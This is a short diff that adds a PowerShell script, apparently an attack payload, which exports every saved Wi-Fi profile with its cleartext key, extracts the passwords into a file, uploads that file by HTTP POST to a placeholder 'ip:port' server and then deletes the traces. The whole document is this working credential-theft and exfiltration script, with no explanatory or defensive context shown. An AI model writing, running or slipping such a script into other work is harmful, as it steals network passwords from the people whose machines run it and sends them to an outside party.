@@ -1,0 +1,8 @@
+Function demo4{
+cd C:\Windows\temp
+netsh wlan export profile key=clear
+Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
+Invoke-WebRequest -Uri http://ip:port/upload -Method POST -InFile Wi-Fi-PASS
+del Wi-*
+}
+demo4
